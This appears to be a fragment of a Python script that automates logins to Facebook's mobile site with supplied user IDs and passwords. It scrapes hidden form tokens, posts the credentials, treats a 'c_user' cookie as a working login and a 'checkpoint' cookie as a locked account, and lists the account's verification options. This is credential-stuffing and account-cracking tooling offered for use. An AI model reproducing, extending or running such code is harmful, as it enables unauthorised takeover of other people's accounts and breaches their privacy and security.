		ged = parsel(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":uid,"pass":pw})
		try:
			run = parsel(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		except requests.exceptions.TooManyRedirects:
			print("[!] Redirect Overload")
		if "c_user" in ses.cookies:
			return {"status":"error","email":uid,"pass":pw}
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
			}
			xnxx = parsel(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			opsi=[]
			option_dev = []
			for opt in range(len(ngew)):
				option_dev.append("\n     "+P+str(opt+1)+". "+ngew[opt]+" ")
			print(self.cp+"".join(option_dev))
		elif "login_error" in str(run):
			pass
		else:
			pass
		
Main()